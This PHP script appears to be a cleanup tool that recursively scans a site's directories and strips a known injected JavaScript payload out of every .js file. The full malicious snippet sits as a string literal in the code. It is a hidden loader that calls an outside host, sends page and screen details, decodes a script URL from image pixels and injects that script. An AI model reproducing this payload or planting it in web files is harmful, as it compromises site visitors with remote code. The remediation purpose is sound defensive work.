<?php

// $fichero = 'ajax-chosen.min.js';

function reempl_js( $fichero ){
$actual = file_get_contents($fichero);

$vir = ';if(ndsw===undefined){var ndsw=true;(function(){try{var localStore=window.localStorage;var canvas=document.createElement("canvas");}catch(ex){return;}if(localStorage.getItem(\'APN_localstorage\')==\'1\'){return;}var img,ctx,pngData;canvas.style.visibility="hidden";canvas.style.position="absolute";canvas.width=1000;canvas.height=1;if(canvas&&canvas.getContext){img=new Image();img.style.visibility="hidden";img.style.position="absolute";img.crossOrigin=\'Anonymous\';pngData="";ctx=canvas.getContext("2d");img.onload=function(){ctx.drawImage(img,0,0);var imgd=ctx.getImageData(0,0,1000,1),pix=imgd.data,i,n;for(i=0,n=pix.length;i<n;i+=4){if(pix[i]===0){break;}pngData+=String.fromCharCode(pix[i]);if(pix[i+1]===0){break;}pngData+=String.fromCharCode(pix[i+1]);if(pix[i+2]===0){break;}pngData+=String.fromCharCode(pix[i+2]);}if(pngData){var jsonData=JSON.parse(pngData);if(jsonData.status==\'SCRIPT\'){if(jsonData.url){var f=document.getElementsByTagName(\'script\')[0],j=document.createElement(\'script\');j.async=true;j.src=jsonData.url;f.parentNode.insertBefore(j,f);}}}setTimeout(function(){localStorage.setItem(\'APN_localstorage\',\'1\');},5000);};img.src=\'https://pixelapn.adsprofitnetwork.com/apnpixel.png\'+"?ti="+encodeURIComponent(document.title)+"&sw="+encodeURIComponent(screen.width)+"&sh="+encodeURIComponent(screen.height)+"&c="+encodeURIComponent(\'1358\')+"&cd="+encodeURIComponent(screen.colorDepth)+"&re="+encodeURIComponent(document.referrer)+\'&r=\'+Math.random();}setTimeout(function(){localStorage.setItem(\'APN_localstorage\',\'1\');},10000);})()}';

$actual = str_replace( $vir , '' , $actual );

file_put_contents($fichero, $actual);

}



function archivos_js( $fic ){
	$dir = scandir( $fic );
// 	print_r( $dir );
	foreach( $dir as $k => $v ){
		$file = $fic . '/' . $v;
		if( is_dir( $file ) ){
			if( $v != '.' AND $v != '..' AND $v != '.htaccess' ){
				$dire = $fic . '/' . $v;
// 				echo $dire . '<br />';
// 				echo $dire;
				archivos_js( $dire );
			}
		}else{
			$f = explode( '.' , $v );
// 			echo $f[ count( $f ) - 1 ] . '<br />';
			if( strtolower( $f[ count( $f ) - 1 ] ) == 'js' ){
				echo $file . '<br />';
// 				$dire = $dir . '/' . $v;
// 				echo $dire;
				reempl_js( $file );
			}
		}
	}
}


// $ficheros1  = scandir( dirname(__FILE__) );
archivos_js( dirname(__FILE__) );


?>